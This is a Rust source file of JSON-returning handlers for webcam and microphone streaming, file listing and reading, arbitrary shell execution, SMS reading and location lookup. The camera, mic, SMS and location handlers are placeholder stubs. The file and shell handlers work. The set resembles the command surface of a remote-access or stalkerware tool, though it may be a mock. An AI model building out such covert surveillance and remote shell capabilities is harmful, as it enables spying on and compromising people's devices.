use serde_json::{json, Value};
use std::fs;

pub fn start_webcam_stream(args: &Value) -> Value {
    json!({
        "status": "streaming_initiated",
        "codec": "h264",
        "resolution": args.get("resolution").and_then(|s| s.as_str()).unwrap_or("1280x720")
    })
}

pub fn start_mic_stream(args: &Value) -> Value {
    json!({
        "status": "audio_streaming_initiated",
        "sample_rate": args.get("sample_rate").and_then(|s| s.as_u64()).unwrap_or(44100)
    })
}

pub fn list_files(path: &str) -> Value {
    let entries = fs::read_dir(path);
    match entries {
        Ok(dir) => {
            let files: Vec<Value> = dir.filter_map(|entry| {
                entry.ok().map(|e| {
                    json!({
                        "name": e.file_name().to_string_lossy(),
                        "path": e.path().to_string_lossy(),
                        "is_dir": e.path().is_dir()
                    })
                })
            }).collect();
            json!({"path": path, "files": files})
        }
        Err(e) => json!({"error": e.to_string()})
    }
}

pub fn read_file(path: &str) -> Value {
    let content = fs::read_to_string(path);
    match content {
        Ok(c) => json!({"content": c}),
        Err(e) => json!({"error": e.to_string()})
    }
}

pub fn execute_shell(script: &str) -> Value {
    let output = std::process::Command::new("sh").arg("-c").arg(script).output();
    match output {
        Ok(o) => json!({
            "stdout": String::from_utf8_lossy(&o.stdout),
            "stderr": String::from_utf8_lossy(&o.stderr),
            "code": o.status.code()
        }),
        Err(e) => json!({"error": e.to_string()})
    }
}

pub fn read_sms(args: &Value) -> Value {
    json!({
        "limit": args.get("limit").and_then(|s| s.as_u64()).unwrap_or(10),
        "messages": []
    })
}

pub fn get_location(args: &Value) -> Value {
    json!({
        "provider": args.get("provider").and_then(|s| s.as_str()).unwrap_or("gps"),
        "latitude": 0.0,
        "longitude": 0.0
    })
}